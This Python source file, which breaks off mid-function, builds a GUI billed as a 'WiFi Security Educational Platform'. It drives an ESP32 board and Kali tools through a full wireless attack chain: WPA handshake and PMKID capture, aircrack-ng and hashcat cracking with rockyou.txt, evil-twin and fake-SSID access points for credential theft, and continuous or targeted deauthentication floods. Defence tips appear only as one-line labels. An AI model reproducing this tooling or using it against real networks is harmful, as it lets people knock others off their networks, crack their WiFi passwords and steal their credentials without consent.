import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import threading, subprocess, os, time, datetime
from serial_client import SerialClient
import audit_engine as ae
import cve_db

import struct, time as _time

# Simple PCAP writer — no scapy needed, writes IEEE 802.11 (linktype=105)
class SimplePcapWriter:
    MAGIC       = 0xa1b2c3d4
    LINKTYPE_80211 = 105
    def __init__(self, path):
        self.f = open(path, 'wb')
        # Global header
        self.f.write(struct.pack('<IHHiIII',
            self.MAGIC, 2, 4, 0, 0, 65535, self.LINKTYPE_80211))
        self.f.flush()
    def write(self, raw_bytes):
        ts = _time.time()
        sec = int(ts); usec = int((ts - sec) * 1e6)
        n = len(raw_bytes)
        self.f.write(struct.pack('<IIII', sec, usec, n, n))
        self.f.write(raw_bytes)
        self.f.flush()
    def close(self):
        try: self.f.close()
        except: pass

SCAPY_AVAILABLE = True  # kept for compatibility flag

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("green")

COLORS = {
    "bg":       "#0d0d0d",
    "panel":    "#141414",
    "card":     "#1a1a1a",
    "border":   "#2a2a2a",
    "green":    "#00ff88",
    "red":      "#ff3333",
    "orange":   "#ff8800",
    "blue":     "#0088ff",
    "purple":   "#9933ff",
    "yellow":   "#ffcc00",
    "text":     "#e0e0e0",
    "dim":      "#666666",
}

# ── Security classification ──────────────────────────────────────────────────
AUTH_MAP = {
    0: ("OPEN",      "#ff2222",  0),
    1: ("WEP",       "#ff5500", 10),
    2: ("WPA",       "#ff8800", 38),
    3: ("WPA2",      "#ffcc00", 62),
    4: ("WPA2-ENT",  "#aadd00", 82),
    5: ("WPA3",      "#00ff88", 97),
    6: ("WPA2/3",    "#00ddaa", 87),
}
RISK_MAP = {
    0:("🔴 CRITICAL","#ff2222"), 1:("🔴 CRITICAL","#ff2222"),
    2:("🟠 HIGH",    "#ff8800"), 3:("🟡 MEDIUM",  "#ffcc00"),
    4:("🟢 LOW",     "#aadd00"), 5:("🟢 SECURE",  "#00ff88"),
    6:("🟢 LOW",     "#00ddaa"),
}
KC_STEPS = [("RECON","1.Recon"),("TARGET","2.Target"),("DEAUTH","3.Deauth"),
            ("CAPTURE","4.Capture"),("CRACK","5.Crack"),("ROGUE","6.EvilTwin"),("AUDIT","7.Audit")]
def ap_label(a):
    return AUTH_MAP.get(int(a),("?","#888",30))[0]
def ap_color(a):
    return AUTH_MAP.get(int(a),("?","#888",30))[1]
def ap_score(a, wps=False):
    return max(0, AUTH_MAP.get(int(a),("?","#888",30))[2] - (25 if wps else 0))
def ap_risk(a):
    return RISK_MAP.get(int(a),("❓ UNKNOWN","#888"))

# ── helpers ──────────────────────────────────────────────────────────────────

def card(parent, **kw):
    return ctk.CTkFrame(parent, fg_color=COLORS["card"],
                        border_color=COLORS["border"], border_width=1, **kw)

def label(parent, text, color=None, size=13, bold=False, **kw):
    font = ctk.CTkFont(family="Courier", size=size, weight="bold" if bold else "normal")
    return ctk.CTkLabel(parent, text=text,
                        text_color=color or COLORS["text"], font=font, **kw)

def btn(parent, text, color, command, width=160):
    return ctk.CTkButton(parent, text=text, fg_color=color,
                         hover_color=color, command=command, width=width,
                         font=ctk.CTkFont(family="Courier", size=12, weight="bold"))

def terminal(parent):
    tb = ctk.CTkTextbox(parent, fg_color="#000000", text_color=COLORS["green"],
                        font=ctk.CTkFont(family="Courier", size=11))
    return tb

# ── main application ──────────────────────────────────────────────────────────

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("WiFi Security Educational Platform  |  TTGO + Kali Node")
        self.geometry("1200x780")
        self.configure(fg_color=COLORS["bg"])

        self.serial = SerialClient(self.on_serial)
        self.networks    = {}   # ssid -> (bssid, ch, rssi, auth)
        self.pcap_file   = "/tmp/ttgo_capture.pcap"
        self.pcap_writer = None
        self.pkt_count   = 0
        self.handshake   = False
        self.net_rows    = {}   # ssid -> row frame (dashboard)
        self.kc_status   = {k:"pending" for k,_ in KC_STEPS}
        self.kc_timeline = []   # (key, status, ts, detail)
        self._kc_rects   = {}   # canvas rect ids
        self._kc_texts   = {}   # canvas text ids
        self._kc_canvas  = None
        self._gantt_canvas = None
        self._dash_frame = None

        self._build_topbar()
        self._build_tabs()

    # ── top bar ──────────────────────────────────────────────────────────────

    def _build_topbar(self):
        bar = ctk.CTkFrame(self, fg_color=COLORS["panel"], height=54)
        bar.pack(fill="x", padx=0, pady=0)

        label(bar, "  ☠  WiFi Sec Node", color=COLORS["green"],
              size=15, bold=True).pack(side="left", padx=12)

        self.port_var = ctk.StringVar(value="Select Port")
        self.port_menu = ctk.CTkOptionMenu(bar, variable=self.port_var,
                                           values=self.serial.get_ports(), width=160)
        self.port_menu.pack(side="left", padx=6, pady=8)

        btn(bar, "↺ Refresh", COLORS["border"], self._refresh_ports, width=90).pack(side="left", padx=4)
        self.conn_btn = btn(bar, "Connect TTGO", "#8b0000", self._toggle_conn, width=140)
        self.conn_btn.pack(side="left", padx=10)

        self.status = label(bar, "● OFFLINE", color=COLORS["red"], size=13, bold=True)
        self.status.pack(side="right", padx=20)

    def _refresh_ports(self):
        ports = self.serial.get_ports()
        self.port_menu.configure(values=ports or ["None"])
        if ports: self.port_var.set(ports[0])

    def _toggle_conn(self):
        if not self.serial.running:
            p = self.port_var.get()
            ok, msg = self.serial.connect(p)
            if ok:
                self.conn_btn.configure(text="Disconnect TTGO", fg_color="#005500")
                self.status.configure(text="● ONLINE", text_color=COLORS["green"])
                self.log(f"[+] Connected on {p}")
            else:
                self.log(f"[!] {msg}")
        else:
            self.serial.disconnect()
            self.conn_btn.configure(text="Connect TTGO", fg_color="#8b0000")
            self.status.configure(text="● OFFLINE", text_color=COLORS["red"])

    # ── tabs ─────────────────────────────────────────────────────────────────

    def _build_tabs(self):
        self.tabs = ctk.CTkTabview(self, fg_color=COLORS["panel"])
        self.tabs.pack(fill="both", expand=True, padx=10, pady=10)

        names = [
            "🗺️   0. Dashboard",
            "🧠  1. Authentication Attacks",
            "🎭  2. Rogue AP / MitM",
            "📡  3. Network Disruption",
            "⚙️   4. Config & WPS Attacks",
            "⛓️   5. Kill Chain",
            "📟  6. Serial Monitor",
        ]
        for n in names:
            self.tabs.add(n)

        self._tab_dashboard()
        self._tab_auth()
        self._tab_rogue()
        self._tab_disruption()
        self._tab_config()
        self._tab_killchain()
        self._tab_serial_monitor()

    # shared target bar helper
    def _target_bar(self, parent):
        bar = card(parent)
        bar.pack(fill="x", pady=(0, 8))
        btn(bar, "▶ Scan Networks", COLORS["blue"],
            lambda: self.serial.send_cmd("CMD:SCAN"), width=150).pack(side="left", padx=10, pady=8)
        self.tgt_var = ctk.StringVar(value="No target selected")
        self.tgt_menu = ctk.CTkOptionMenu(bar, variable=self.tgt_var,
                                          values=["Run scan first"], width=300)
        self.tgt_menu.pack(side="left", padx=10)
        label(bar, "← Select target AP from scan results", color=COLORS["dim"]).pack(side="left")
        return bar

    # ── Tab 1 : Authentication Attacks ────────────────────────────────────────
    def _tab_auth(self):
        f = self.tabs.tab("🧠  1. Authentication Attacks")

        label(f, "CATEGORY: Authentication Attacks — Weak Password Guessing & WPA Handshake Capture",
              color=COLORS["yellow"], bold=True, size=13).pack(anchor="w", pady=(8,4), padx=10)

        self._target_bar(f)

        row = ctk.CTkFrame(f, fg_color="transparent")
        row.pack(fill="x", padx=4)

        # ── Sniff / Capture card ──
        c1 = card(row)
        c1.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c1, "[ STEP 1 ]  WPA Handshake Capture", color=COLORS["green"], bold=True).pack(anchor="w", padx=10, pady=6)
        label(c1, "Put TTGO into promiscuous mode on the target channel.\n"
                  "When a device authenticates, the EAPOL 4-way handshake\n"
                  "frames are captured and saved to a .pcap file locally.",
              color=COLORS["dim"]).pack(anchor="w", padx=10)

        btn(c1, "▶ Engage Sniffer", COLORS["purple"], self._sniff_start).pack(padx=10, pady=6)
        btn(c1, "■ Stop Sniffer",   COLORS["border"], lambda: self.serial.send_cmd("CMD:SNIFF_STOP"), width=160).pack(padx=10, pady=2)

        self.pcap_lbl = label(c1, "PCAP: 0 frames captured", color=COLORS["yellow"])
        self.pcap_lbl.pack(padx=10, pady=6)

        # ── Crack card ──
        c2 = card(row)
        c2.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c2, "[ STEP 2 ]  Dictionary Attack via Aircrack-ng", color=COLORS["red"], bold=True).pack(anchor="w", padx=10, pady=6)
        label(c2, "Feed the captured .pcap to Kali's aircrack-ng with\n"
                  "the rockyou.txt wordlist. Demonstrates how weak\n"
                  "passwords are cracked in minutes.",
              color=COLORS["dim"]).pack(anchor="w", padx=10)

        self.cap_var = ctk.StringVar(value="/tmp/ttgo_capture.pcap")
        self.wl_var  = ctk.StringVar(value="/usr/share/wordlists/rockyou.txt")
        fi = ctk.CTkFrame(c2, fg_color="transparent"); fi.pack(fill="x", padx=10, pady=4)
        label(fi, ".cap:").grid(row=0,column=0,sticky="w")
        ctk.CTkEntry(fi, textvariable=self.cap_var, width=200).grid(row=0,column=1,padx=4)
        btn(fi,"…",COLORS["border"],lambda:self.cap_var.set(filedialog.askopenfilename()),width=40).grid(row=0,column=2)
        label(fi, "wl: ").grid(row=1,column=0,sticky="w",pady=4)
        ctk.CTkEntry(fi, textvariable=self.wl_var,  width=200).grid(row=1,column=1,padx=4)
        btn(fi,"…",COLORS["border"],lambda:self.wl_var.set(filedialog.askopenfilename()),width=40).grid(row=1,column=2)

        btn(c2, "⚡ Run Aircrack-ng", COLORS["red"], self._run_crack).pack(padx=10, pady=6)

        self.crack_box = terminal(f)
        self.crack_box.pack(fill="both", expand=True, padx=4, pady=4)

        label(f, "🛡 DEFENSE: Use WPA3 · Long random passphrases · Rate limiting",
              color=COLORS["green"], size=11).pack(anchor="w", padx=10, pady=4)

        # ── PMKID Hunt card ──
        pc = card(f); pc.pack(fill="x", padx=4, pady=(0,4))
        label(pc, "🔑 PMKID Attack (Clientless WPA2 Capture)",
              color=COLORS["yellow"], bold=True).pack(anchor="w", padx=10, pady=(8,2))
        label(pc, "Passively sniff EAPOL Msg1 from the AP. No connected client needed.\n"
                  "Captured PMKID → hashcat -m 22000 → passphrase in minutes.",
              color=COLORS["dim"], size=10).pack(anchor="w", padx=10)

        pr = ctk.CTkFrame(pc, fg_color="transparent"); pr.pack(fill="x", padx=10, pady=6)
        label(pr, "Channel:").pack(side="left")
        self._pmkid_ch = ctk.CTkEntry(pr, width=50, placeholder_text="6")
        self._pmkid_ch.pack(side="left", padx=6)
        self._pmkid_btn = btn(pr, "▶ Start PMKID Hunt", COLORS["yellow"],
                              self._pmkid_toggle, width=160)
        self._pmkid_btn.pack(side="left", padx=4)
        self._pmkid_running = False
        self._pmkid_rows = []   # list of (ap_mac, sta_mac, pmkid_hex)

        # Results table header
        th = ctk.CTkFrame(pc, fg_color=COLORS["bg"]); th.pack(fill="x", padx=10, pady=(0,2))
        for txt, w in [("AP MAC",130),("STA MAC",130),("PMKID (first 16 hex)",220),("#",30)]:
            ctk.CTkLabel(th, text=txt, font=ctk.CTkFont(family="Courier",size=10,weight="bold"),
                         text_color=COLORS["green"], width=w, anchor="w").pack(side="left", padx=2)

        self._pmkid_scroll = ctk.CTkScrollableFrame(pc, fg_color=COLORS["bg"], height=100)
        self._pmkid_scroll.pack(fill="x", padx=10, pady=2)

        pb = ctk.CTkFrame(pc, fg_color="transparent"); pb.pack(fill="x", padx=10, pady=4)
        btn(pb, "💾 Export .hc22000", COLORS["blue"],
            self._pmkid_export, width=155).pack(side="left", padx=4)
        btn(pb, "🔨 Crack (hashcat)", COLORS["red"],
            self._pmkid_crack,  width=155).pack(side="left", padx=4)
        self._pmkid_status = label(pb, "", color=COLORS["dim"], size=10)
        self._pmkid_status.pack(side="left", padx=8)


    def _sniff_start(self):
        t = self.tgt_var.get()
        if t not in self.networks:
            self.log("[!] Select a target first"); return
        bssid, ch, _, _ = self.networks[t]
        if SCAPY_AVAILABLE:
            self.pcap_writer = SimplePcapWriter(self.pcap_file)
            self.pkt_count = 0; self.handshake = False
            self.pcap_lbl.configure(text="PCAP: 0 frames captured", text_color=COLORS["yellow"])
        self.serial.send_cmd(f"CMD:SNIFF_START:{ch}")
        self.log(f"[*] Sniffer on CH {ch} targeting {bssid}")
        self.kc_update("CAPTURE", "running", f"Sniffing CH{ch} for EAPOL")

    # ── PMKID methods ──
    def _pmkid_toggle(self):
        if not self._pmkid_running:
            ch = self._pmkid_ch.get().strip() or "6"
            if not ch.isdigit() or not 1 <= int(ch) <= 13:
                self._pmkid_status.configure(text="Invalid channel (1-13)",
                                             text_color=COLORS["red"]); return
            self._pmkid_running = True
            self._pmkid_btn.configure(text="■ Stop PMKID Hunt", fg_color=COLORS["red"])
            self._pmkid_status.configure(text=f"Hunting on CH {ch}…",
                                         text_color=COLORS["yellow"])
            self.serial.send_cmd(f"CMD:PMKID_HUNT:{ch}")
            self.kc_update("CAPTURE", "running", f"PMKID hunt CH{ch}")
        else:
            self._pmkid_running = False
            self._pmkid_btn.configure(text="▶ Start PMKID Hunt", fg_color=COLORS["yellow"])
            self.serial.send_cmd("CMD:PMKID_STOP")

    def _pmkid_add_row(self, ap_mac, sta_mac, pmkid_hex):
        """Add a captured PMKID row to the scrollable table."""
        # Deduplicate
        for r in self._pmkid_rows:
            if r[2] == pmkid_hex:
                return
        idx = len(self._pmkid_rows) + 1
        self._pmkid_rows.append((ap_mac, sta_mac, pmkid_hex))
        row = ctk.CTkFrame(self._pmkid_scroll, fg_color="#0d0d1e")
        row.pack(fill="x", pady=1)
        for txt, w in [(ap_mac,130),(sta_mac,130),(pmkid_hex[:32]+"…",220),(str(idx),30)]:
            ctk.CTkLabel(row, text=txt,
                         font=ctk.CTkFont(family="Courier",size=10),
                         text_color="#00ffaa", width=w, anchor="w").pack(side="left", padx=2)
        self._pmkid_status.configure(
            text=f"{idx} PMKID(s) captured", text_color=COLORS["green"])
        self.kc_update("CAPTURE", "done", f"PMKID captured: {ap_mac}")

    def _pmkid_export(self):
        """Export captured PMKIDs in hashcat hc22000 format."""
        if not self._pmkid_rows:
            self._pmkid_status.configure(text="No PMKIDs captured yet",
                                         text_color=COLORS["red"]); return
        import tkinter.filedialog as fd
        path = fd.asksaveasfilename(
            defaultextension=".hc22000",
            filetypes=[("hashcat hc22000","*.hc22000"),("All","*")],
            initialfile="pmkid_capture.hc22000",
            title="Save hashcat file")
        if not path: return
        with open(path, "w") as fh:
            for ap, sta, pmkid in self._pmkid_rows:
                ap_hex  = ap.replace(":","")
                sta_hex = sta.replace(":","")
                # hashcat -m 22000 format
                fh.write(f"WPA*01*{pmkid}*{ap_hex}*{sta_hex}**\n")
        self._pmkid_status.configure(
            text=f"Saved {len(self._pmkid_rows)} PMKIDs → {path}",
            text_color=COLORS["green"])

    def _pmkid_crack(self):
        """Run hashcat -m 22000 on the exported file."""
        if not self._pmkid_rows:
            self._pmkid_status.configure(text="Export first",
                                         text_color=COLORS["red"]); return
        import tkinter.filedialog as fd
        hc_path = fd.askopenfilename(
            filetypes=[("hc22000","*.hc22000"),("All","*")],
            title="Select hc22000 file")
        if not hc_path: return
        wl = "/usr/share/wordlists/rockyou.txt"
        cmd = ["hashcat","-m","22000",hc_path, wl,"--force","-o","pmkid_cracked.txt"]
        self.crack_box.insert("end", f"[*] Running: {' '.join(cmd)}\n")
        def _run():
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT, text=True)
                for line in proc.stdout:
                    self.crack_box.insert("end", line)
                    self.crack_box.see("end")
                self.crack_box.insert("end", "[+] hashcat done\n")
            except FileNotFoundError:
                self.crack_box.insert("end",
                    "[!] hashcat not found. Install: sudo apt install hashcat\n")
        threading.Thread(target=_run, daemon=True).start()

    def _run_crack(self):
        cap, wl = self.cap_var.get(), self.wl_var.get()
        self.crack_box.delete("0.0","end")
        self.crack_box.insert("end","[*] Starting aircrack-ng...\n\n")
        if not os.path.exists(cap):
            self.crack_box.insert("end","[!] PCAP file not found!\n"); return

        # Build command — pass BSSID and ESSID to skip interactive prompt
        cmd = ["aircrack-ng", "-w", wl]
        t = self.tgt_var.get()
        if t in self.networks:
            bssid = self.networks[t][0]
            cmd += ["-b", bssid, "-e", t]
            self.crack_box.insert("end", f"[*] Target: {t} ({bssid})\n")
        cmd.append(cap)

        try:
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                 text=True, bufsize=1)
            def _read():
                for ln in p.stdout:
                    self.crack_box.insert("end", ln)
                    self.crack_box.see("end")
                    if "KEY FOUND" in ln:
                        self.crack_box.insert("end", "\n[!!!] PASSWORD CRACKED [!!!]\n")
                        self.kc_update("CRACK", "done", "Key found!")
                self.crack_box.insert("end", "\n[*] Aircrack-ng finished.\n")
                if self.kc_status.get("CRACK") == "running":
                    self.kc_update("CRACK", "failed", "Key not found")
            threading.Thread(target=_read, daemon=True).start()
            self.kc_update("CRACK", "running", f"aircrack-ng on {cap}")
        except FileNotFoundError:
            self.crack_box.insert("end","[!] aircrack-ng not found. Run: sudo apt install aircrack-ng\n")


    # ── Tab 2 : Rogue AP ──────────────────────────────────────────────────────
    def _tab_rogue(self):
        f = self.tabs.tab("🎭  2. Rogue AP / MitM")

        label(f, "CATEGORY: Rogue Access Point / Evil Twin — Credential Theft via Impersonation",
              color=COLORS["yellow"], bold=True, size=13).pack(anchor="w", pady=(8,4), padx=10)

        self._target_bar_local(f)

        row = ctk.CTkFrame(f, fg_color="transparent"); row.pack(fill="x", padx=4)

        c1 = card(row); c1.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c1,"Evil Twin AP", color=COLORS["red"], bold=True).pack(anchor="w",padx=10,pady=6)
        label(c1,"The TTGO creates an open SoftAP with the EXACT same\n"
                 "SSID as the target. Devices auto-join because they trust\n"
                 "the name. Credentials can be captured at the portal.",
              color=COLORS["dim"]).pack(anchor="w",padx=10)
        btn(c1,"▶ Launch Evil Twin", COLORS["red"],    self._rogue_start).pack(padx=10,pady=8)
        btn(c1,"■ Stop Evil Twin",   COLORS["border"], lambda: self.serial.send_cmd("CMD:ROGUE_STOP")).pack(padx=10)
        self.rogue_status = label(c1, "Status: Inactive", color=COLORS["dim"])
        self.rogue_status.pack(padx=10, pady=6)

        c2 = card(row); c2.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c2,"Custom SSID Override", color=COLORS["orange"], bold=True).pack(anchor="w",padx=10,pady=6)
        label(c2,"You can also broadcast a completely custom SSID name\n"
                 "instead of cloning the target. Useful for social engineering\n"
                 "demonstrations (free WiFi, airport, hotel, etc.).",
              color=COLORS["dim"]).pack(anchor="w",padx=10)
        fi = ctk.CTkFrame(c2, fg_color="transparent"); fi.pack(padx=10,pady=8,fill="x")
        self.custom_ssid = ctk.CTkEntry(fi, placeholder_text="e.g. Free_Airport_WiFi")
        self.custom_ssid.pack(fill="x", pady=4)
        btn(c2,"▶ Broadcast Custom SSID", COLORS["orange"], self._rogue_custom).pack(padx=10)

        self.rogue_log = terminal(f)
        self.rogue_log.pack(fill="both", expand=True, padx=4, pady=4)

        label(f,"🛡 DEFENSE: Disable auto-join · Use WPA3 with PMF · Verify AP certificate · User awareness",
              color=COLORS["green"], size=11).pack(anchor="w", padx=10, pady=4)

    def _target_bar_local(self, parent):
        bar = card(parent); bar.pack(fill="x", pady=(0,8))
        btn(bar,"▶ Scan Networks", COLORS["blue"],
            lambda: self.serial.send_cmd("CMD:SCAN"), width=150).pack(side="left",padx=10,pady=8)
        self.tgt_var2 = ctk.StringVar(value="No target selected")
        self.tgt_menu2 = ctk.CTkOptionMenu(bar, variable=self.tgt_var2,
                                           values=["Run scan first"], width=300)
        self.tgt_menu2.pack(side="left", padx=10)

    def _rogue_start(self):
        t = self.tgt_var2.get()
        if t not in self.networks:
            self.rogue_log.insert("end","[!] Select a target\n"); return
        self.serial.send_cmd(f"CMD:ROGUE:{t}")
        self.rogue_status.configure(text=f"Broadcasting: {t}", text_color=COLORS["red"])
        self.rogue_log.insert("end",f"[*] Evil Twin launched with SSID: {t}\n")
        self.kc_update("ROGUE", "running", f"Evil Twin: {t}")

    def _rogue_custom(self):
        ssid = self.custom_ssid.get().strip()
        if not ssid:
            self.rogue_log.insert("end","[!] Enter a custom SSID\n"); return
        self.serial.send_cmd(f"CMD:ROGUE:{ssid}")
        self.rogue_status.configure(text=f"Broadcasting: {ssid}", text_color=COLORS["orange"])
        self.rogue_log.insert("end",f"[*] Custom SSID launched: {ssid}\n")

    # ── Tab 3 : Disruption ────────────────────────────────────────────────────
    def _tab_disruption(self):
        f = self.tabs.tab("📡  3. Network Disruption")

        label(f,"CATEGORY: Network Disruption — Deauthentication & Forced Reconnection",
              color=COLORS["yellow"], bold=True, size=13).pack(anchor="w", pady=(8,4), padx=10)

        self._target_bar_d(f)

        row = ctk.CTkFrame(f, fg_color="transparent"); row.pack(fill="x", padx=4)

        # ── Single Burst card ──
        c1 = card(row); c1.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c1,"Deauth + Disassoc Burst", color=COLORS["red"], bold=True).pack(anchor="w",padx=10,pady=6)
        label(c1,"Injects Deauth (0xC0) + Disassoc (0xA0) frames\n"
                 "in BOTH directions at MAX TX power (21 dBm).\n"
                 "500 frames × 5 ms = ~2.5 sec · ~200 pps.",
              color=COLORS["dim"]).pack(anchor="w",padx=10)
        btn(c1,"⚡ Fire Deauth Burst", COLORS["red"], self._deauth).pack(padx=10,pady=8)
        self.deauth_status = label(c1,"Status: Idle", color=COLORS["dim"])
        self.deauth_status.pack(padx=10)

        # ── Continuous Deauth card ──
        c3 = card(row); c3.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c3,"Continuous Deauth (Loop)", color=COLORS["orange"], bold=True).pack(anchor="w",padx=10,pady=6)
        label(c3,"FreeRTOS task floods Deauth + Disassoc frames\n"
                 "at MAX TX power until stopped.\n"
                 "~200 pps — device cannot reconnect.",
              color=COLORS["dim"]).pack(anchor="w",padx=10)
        self._deauth_cont_running = False
        self.deauth_cont_btn = btn(c3,"▶ Start Continuous", COLORS["orange"], self._deauth_cont_toggle)
        self.deauth_cont_btn.pack(padx=10,pady=8)
        self.deauth_cont_status = label(c3,"Status: Stopped", color=COLORS["dim"])
        self.deauth_cont_status.pack(padx=10)

        # ── Targeted Unicast Deauth card ── (NEW)
        c5 = card(row); c5.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c5,"🎯 Targeted Unicast Deauth", color=COLORS["purple"], bold=True).pack(anchor="w",padx=10,pady=6)
        label(c5,"Sends unicast Deauth+Disassoc directly to ONE\n"
                 "client's MAC. Bypasses PMF broadcast filtering.\n"
                 "Most effective against PMF-optional devices.",
              color=COLORS["dim"]).pack(anchor="w",padx=10)
        fi5 = ctk.CTkFrame(c5, fg_color="transparent"); fi5.pack(padx=10, pady=6, fill="x")
        label(fi5, "Client MAC:", size=11).pack(anchor="w")
        self._client_mac_var = ctk.StringVar(value="")
        self._client_mac_entry = ctk.CTkEntry(
            fi5, textvariable=self._client_mac_var,
            placeholder_text="aa:bb:cc:dd:ee:ff  (from sniffer)",
            width=200, font=ctk.CTkFont(family="Courier", size=11))
        self._client_mac_entry.pack(fill="x", pady=3)
        label(fi5, "← auto-filled from sniffed frames", color=COLORS["dim"], size=10).pack(anchor="w")
        btn(c5,"🎯 Fire Targeted Deauth", COLORS["purple"], self._deauth_targeted).pack(padx=10, pady=6)
        self._targeted_status = label(c5, "Status: Idle", color=COLORS["dim"])
        self._targeted_status.pack(padx=10)

        # ── Why This Works card ──
        c2 = card(row); c2.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c2,"Why This Works", color=COLORS["orange"], bold=True).pack(anchor="w",padx=10,pady=6)
        label(c2,"In WPA2, management frames (deauth/disassoc) are\n"
                 "UNENCRYPTED and UNAUTHENTICATED. Any device\n"
                 "can spoof them. This forces a reconnect — when\n"
                 "the client reconnects, EAPOL handshake is captured.\n\n"
                 "WPA3 mandates Protected Management Frames (PMF)\n"
                 "which encrypts these frames and stops this attack.",
              color=COLORS["dim"]).pack(anchor="w",padx=10)

        # ── Kali aireplay-ng card (most reliable) ──
        c4 = card(row); c4.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c4,"⚡ Kali aireplay-ng (MOST RELIABLE)", color=COLORS["green"], bold=True).pack(anchor="w",padx=10,pady=6)
        label(c4,"Uses YOUR Kali WiFi adapter in monitor mode.\n"
                 "Far stronger signal than ESP32. Works against\n"
                 "WPA2 networks where PMF is disabled.",
              color=COLORS["dim"]).pack(anchor="w",padx=10)
        fi4 = ctk.CTkFrame(c4, fg_color="transparent"); fi4.pack(padx=10, pady=6, fill="x")
        label(fi4, "Interface:", size=11).grid(row=0, column=0, sticky="w")
        self.aireplay_iface = ctk.CTkEntry(fi4, placeholder_text="wlan0mon", width=120)
        self.aireplay_iface.grid(row=0, column=1, padx=6)
        self._aireplay_proc = None
        self._aireplay_running = False
        self.aireplay_btn = btn(c4, "▶ Start aireplay-ng", COLORS["green"], self._aireplay_toggle)
        self.aireplay_btn.pack(padx=10, pady=6)
        self.aireplay_status = label(c4, "Status: Idle", color=COLORS["dim"])
        self.aireplay_status.pack(padx=10)
        label(c4, "sudo airmon-ng start wlan0  → sets wlan0mon",
              color=COLORS["dim"], size=10).pack(padx=10, pady=(4,2))

        self.deauth_log = terminal(f)
        self.deauth_log.pack(fill="both", expand=True, padx=4, pady=4)

        label(f,"🛡 DEFENSE: Enable WPA3 · Enable PMF (802.11w) · Modern routers auto-enable this",
              color=COLORS["green"], size=11).pack(anchor="w", padx=10, pady=4)


    def _target_bar_d(self, parent):
        bar = card(parent); bar.pack(fill="x", pady=(0,8))
        btn(bar,"▶ Scan Networks", COLORS["blue"],
            lambda: self.serial.send_cmd("CMD:SCAN"), width=150).pack(side="left",padx=10,pady=8)
        self.tgt_var3 = ctk.StringVar(value="No target selected")
        self.tgt_menu3 = ctk.CTkOptionMenu(bar, variable=self.tgt_var3,
                                           values=["Run scan first"], width=300)
        self.tgt_menu3.pack(side="left", padx=10)

    def _aireplay_toggle(self):
        t = self.tgt_var3.get()
        if t not in self.networks:
            self.deauth_log.insert("end","[!] Select a target network first\n"); return
        iface = self.aireplay_iface.get().strip() or "wlan0mon"
        bssid, ch, _, _ = self.networks[t]

        if not self._aireplay_running:
            # Start aireplay-ng: -0 0 = continuous deauth, -a = AP bssid
            cmd = ["sudo", "aireplay-ng", "--deauth", "0",
                   "-a", bssid, iface]
            self.deauth_log.insert("end",
                f"[*] Kali deauth via aireplay-ng\n"
                f"    Interface : {iface}\n"
                f"    Target AP : {bssid}  CH{ch}\n"
                f"    Command   : {' '.join(cmd)}\n\n")
            self.deauth_log.see("end")
            try:
                self._aireplay_proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1)
                self._aireplay_running = True
                self.aireplay_btn.configure(text="■ Stop aireplay-ng", fg_color=COLORS["border"])
                self.aireplay_status.configure(text="🔴 DEAUTH FLOODING", text_color=COLORS["red"])
                # Stream output to terminal
                def _read():
                    for ln in self._aireplay_proc.stdout:
                        self.deauth_log.insert("end", ln)
                        self.deauth_log.see("end")
                    self.deauth_log.insert("end","[*] aireplay-ng stopped.\n")
                    self._aireplay_running = False
                    self.aireplay_btn.configure(text="▶ Start aireplay-ng", fg_color=COLORS["green"])
                    self.aireplay_status.configure(text="Status: Idle", text_color=COLORS["dim"])
                threading.Thread(target=_read, daemon=True).start()
            except FileNotFoundError:
                self.deauth_log.insert("end",
                    "[!] aireplay-ng not found.\n"
                    "    Run on Kali: sudo apt install aircrack-ng\n")
        else:
            # Stop
            if self._aireplay_proc:
                self._aireplay_proc.terminate()
                self._aireplay_proc = None
            self._aireplay_running = False
            self.aireplay_btn.configure(text="▶ Start aireplay-ng", fg_color=COLORS["green"])
            self.aireplay_status.configure(text="Stopped", text_color=COLORS["dim"])
            self.deauth_log.insert("end","[*] aireplay-ng terminated.\n")

    def _deauth(self):
        t = self.tgt_var3.get()
        if t not in self.networks:
            self.deauth_log.insert("end","[!] Select a target\n"); return
        bssid, ch, _, _ = self.networks[t]
        self.serial.send_cmd(f"CMD:DEAUTH:{bssid}:{ch}")
        self.deauth_status.configure(text="Burst injecting...", text_color=COLORS["red"])
        self.deauth_log.insert("end",f"[*] Firing Reason-7 Deauth at {bssid} CH{ch}\n")
        self.deauth_log.insert("end",f"    Bidirectional · 200 frames · ~4 sec burst\n")
        self.kc_update("DEAUTH", "running", f"Burst → {bssid} CH{ch}")

    def _deauth_cont_toggle(self):
        t = self.tgt_var3.get()
        if t not in self.networks:
            self.deauth_log.insert("end","[!] Select a target first\n"); return
        bssid, ch, _, _ = self.networks[t]
        if not self._deauth_cont_running:
            self._deauth_cont_running = True
            self.serial.send_cmd(f"CMD:DEAUTH_CONT:{bssid}:{ch}")
            self.deauth_cont_btn.configure(text="■ Stop Continuous", fg_color=COLORS["border"])
            self.deauth_cont_status.configure(text="Running — flooding deauth+disassoc", text_color=COLORS["red"])
            self.deauth_log.insert("end",f"[*] Continuous deauth STARTED at {bssid} CH{ch}\n")
            self.deauth_log.insert("end",f"    Deauth+Disassoc · MAX TX power · ~200 pps · Press Stop to halt\n")
            self.kc_update("DEAUTH", "running", f"Continuous → {bssid}")
        else:
            self._deauth_cont_running = False
            self.serial.send_cmd("CMD:DEAUTH_STOP")
            self.deauth_cont_btn.configure(text="▶ Start Continuous", fg_color=COLORS["orange"])
            self.deauth_cont_status.configure(text="Stopped", text_color=COLORS["dim"])
            self.deauth_log.insert("end","[*] Continuous deauth STOPPED\n")

    def _deauth_targeted(self):
        """Send unicast deauth+disassoc to a specific client MAC (FIX 4)."""
